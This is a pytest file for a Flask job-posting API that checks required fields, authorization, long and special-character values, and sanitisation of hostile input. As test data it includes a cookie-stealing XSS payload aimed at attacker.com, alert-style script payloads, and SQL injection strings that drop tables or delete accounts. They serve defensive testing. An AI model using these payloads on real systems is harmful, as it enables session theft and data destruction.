"""
test_job_validation.py - Tests for job data validation and error handling

This script tests validation of job data including:
- Required fields validation
- Data type validation
- Handling of XSS attacks in job descriptions
- API error responses
"""

import pytest
import json
from app import app, get_db_connection
from datetime import datetime, timedelta

@pytest.fixture
def client():
    """Create a test client for the app."""
    app.config['TESTING'] = True
    with app.test_client() as client:
        yield client

@pytest.fixture
def authenticated_client(client):
    """Create an authenticated client session."""
    user_data = {
        "firstName": "Job",
        "lastName": "Tester",
        "email": "job_test@example.com",
        "password": "JobTest123!"
    }
    
    # Delete the user if it already exists
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM dbo.accounts WHERE email = ?", (user_data["email"],))
        conn.commit()
    
    # Create the user
    response = client.post(
        '/api/register',
        data=json.dumps(user_data),
        content_type='application/json'
    )
    
    # Login
    response = client.post(
        '/api/login',
        data=json.dumps({
            "email": user_data["email"],
            "password": user_data["password"]
        }),
        content_type='application/json'
    )
    
    # Extract user ID from response
    data = json.loads(response.data)
    user_id = data.get("userId")
    
    # Set session variables
    with client.session_transaction() as session:
        session['user_id'] = user_id
        session['user_email'] = user_data["email"]
        session['user_name'] = user_data["firstName"]
    
    return client

def test_create_job_missing_required_fields(authenticated_client):
    """Test creating a job with missing required fields."""
    # Missing title
    job_data = {
        "company": "Test Company",
        "description": "A job description"
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    assert response.status_code == 400
    data = json.loads(response.data)
    assert "message" in data
    assert "title" in data["message"].lower() or "description" in data["message"].lower()
    
    # Missing description
    job_data = {
        "title": "Test Job",
        "company": "Test Company"
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    assert response.status_code == 400
    data = json.loads(response.data)
    assert "message" in data
    assert "description" in data["message"].lower()

def test_create_job_with_xss_content(authenticated_client):
    """Test creating a job with potentially malicious content."""
    job_data = {
        "title": "Test Job <script>alert('XSS')</script>",
        "company": "Test Company",
        "description": "<p>Description</p><script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
        "location": "Test Location <img src=\"x\" onerror=\"alert('XSS')\">",
        "tags": ["<script>alert('XSS')</script>", "Tag2"]
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    assert response.status_code == 201
    data = json.loads(response.data)
    
    # Verify XSS content is sanitized
    job = data.get("job", {})
    assert "<script>" not in job.get("title", "")
    assert "alert('XSS')" not in job.get("title", "")
    assert "<script>" not in job.get("location", "")
    
    # HTML might be allowed in description depending on sanitization settings
    if "<script>" in job.get("description", ""):
        assert "document.location" not in job.get("description", "")
    
    # Test tags sanitization
    tags = job.get("tags", [])
    for tag in tags:
        assert "<script>" not in tag
        assert "alert('XSS')" not in tag

def test_create_job_with_invalid_date(authenticated_client):
    """Test creating a job with invalid date format."""
    job_data = {
        "title": "Test Job",
        "company": "Test Company",
        "description": "A job description",
        "deadline": "not-a-date"
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    # The API might handle this gracefully by ignoring the invalid date
    # or might return an error
    assert response.status_code in (201, 400)
    
    # If it succeeded, verify the deadline was either ignored or sanitized
    if response.status_code == 201:
        data = json.loads(response.data)
        job = data.get("job", {})
        assert job.get("deadline") != "not-a-date"

def test_update_nonexistent_job(authenticated_client):
    """Test updating a job that doesn't exist."""
    job_id = 999999  # Use a high number unlikely to exist
    
    job_data = {
        "title": "Updated Job",
        "description": "Updated description"
    }
    
    response = authenticated_client.put(
        f'/api/jobs/{job_id}',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    assert response.status_code == 404
    data = json.loads(response.data)
    assert "message" in data
    assert "not found" in data["message"].lower()

def test_access_another_users_job(authenticated_client):
    """Test attempting to access/modify another user's job."""
    # Create a job as the current user
    job_data = {
        "title": "My Job",
        "description": "My job description"
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    assert response.status_code == 201
    job_id = json.loads(response.data).get("job", {}).get("jobId")
    
    # Now create another user and attempt to access/update the first user's job
    other_user = {
        "firstName": "Other",
        "lastName": "User",
        "email": "other_user@example.com",
        "password": "OtherUser123!"
    }
    
    # Register the other user
    authenticated_client.post(
        '/api/register',
        data=json.dumps(other_user),
        content_type='application/json'
    )
    
    # Log in as the other user
    authenticated_client.post(
        '/api/login',
        data=json.dumps({
            "email": other_user["email"],
            "password": other_user["password"]
        }),
        content_type='application/json'
    )
    
    # Set session for the other user
    with authenticated_client.session_transaction() as session:
        # Clear existing user
        session.clear()
        # Set other user's session
        session['user_id'] = 9999  # Dummy ID that's different from first user
        session['user_email'] = other_user["email"]
        session['user_name'] = other_user["firstName"]
    
    # Try to update the first user's job
    update_data = {
        "title": "Unauthorized Update",
        "description": "This should fail"
    }
    
    response = authenticated_client.put(
        f'/api/jobs/{job_id}',
        data=json.dumps(update_data),
        content_type='application/json'
    )
    
    # Should be forbidden or not found
    assert response.status_code in (403, 404)
    data = json.loads(response.data)
    assert "message" in data
    assert "unauthorized" in data["message"].lower() or "not found" in data["message"].lower()

def test_job_with_extremely_long_values(authenticated_client):
    """Test creating a job with extremely long field values."""
    # Generate very long strings
    very_long_title = "A" * 1000
    very_long_description = "B" * 10000
    
    job_data = {
        "title": very_long_title,
        "description": very_long_description,
        "company": "C" * 1000,
        "location": "D" * 1000
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    # The application should handle this gracefully
    # either by accepting it (if the database can handle it)
    # or by returning a clear error
    assert response.status_code in (201, 400)
    
    if response.status_code == 201:
        data = json.loads(response.data)
        job = data.get("job", {})
        
        # If successful, check if the values were truncated
        assert len(job.get("title", "")) <= len(very_long_title)

def test_job_with_special_characters(authenticated_client):
    """Test creating a job with special characters."""
    job_data = {
        "title": "Job with special chars: ö é è ê ü ñ ç",
        "company": "Compañía Интернациональ",
        "description": "Special character test: © ® ™ € £ ¥ § ¶ • ★ ☆ ♠ ♣ ♥ ♦",
        "tags": ["café", "résumé", "naïve"]
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    assert response.status_code == 201
    data = json.loads(response.data)
    job = data.get("job", {})
    
    # Check that special characters are preserved
    assert "ö" in job.get("title", "")
    assert "ñ" in job.get("company", "")
    assert "©" in job.get("description", "")
    
    # Tags might be stored as a comma-separated string
    if isinstance(job.get("tags"), list):
        assert any("é" in tag for tag in job.get("tags", []))
    else:
        assert "é" in job.get("tags", "")

def test_job_with_sql_injection_attempt(authenticated_client):
    """Test creating a job with SQL injection attempt."""
    job_data = {
        "title": "SQL Injection Test",
        "company": "Company'; DROP TABLE jobs; --",
        "description": "This is a test for SQL injection protection",
        "location": "Location'; DELETE FROM accounts WHERE 1=1; --"
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    # Should either succeed with sanitized data or return an error
    assert response.status_code in (201, 400)
    
    if response.status_code == 201:
        # If successful, check that malicious SQL is sanitized
        data = json.loads(response.data)
        job = data.get("job", {})
        
        assert "'" not in job.get("company", "")
        assert "DROP TABLE" in job.get("company", "") or "DROP" in job.get("company", "")  # The words might be allowed, just not the SQL syntax
        assert ";" not in job.get("company", "")
        
        # Verify database is still functional by fetching jobs
        list_response = authenticated_client.get('/api/jobs')
        assert list_response.status_code == 200
        jobs = json.loads(list_response.data)
        assert isinstance(jobs, list)
        
def test_concurrent_job_operations(authenticated_client):
    """Test handling concurrent job operations."""
    # Create a job
    job_data = {
        "title": "Concurrent Test Job",
        "description": "Testing concurrent operations"
    }
    
    response = authenticated_client.post(
        '/api/jobs',
        data=json.dumps(job_data),
        content_type='application/json'
    )
    
    assert response.status_code == 201
    job_id = json.loads(response.data).get("job", {}).get("jobId")
    
    # Simulate concurrent updates by making multiple requests
    update_data = {
        "title": "Updated Job",
        "description": "Updated description"
    }
    
    # Send 3 concurrent updates (as concurrent as possible in testing)
    responses = []
    for i in range(3):
        update_data["title"] = f"Updated Job {i}"
        response = authenticated_client.put(
            f'/api/jobs/{job_id}',
            data=json.dumps(update_data),
            content_type='application/json'
        )
        responses.append(response)
    
    # All should succeed with status code 200
    for response in responses:
        assert response.status_code == 200
    
    # Verify the job was updated (should have the last update)
    get_response = authenticated_client.get('/api/jobs')
    jobs = json.loads(get_response.data)
    
    updated_job = next((job for job in jobs if job.get("jobId") == job_id), None)
    assert updated_job is not None
    assert updated_job.get("title") == "Updated Job 2"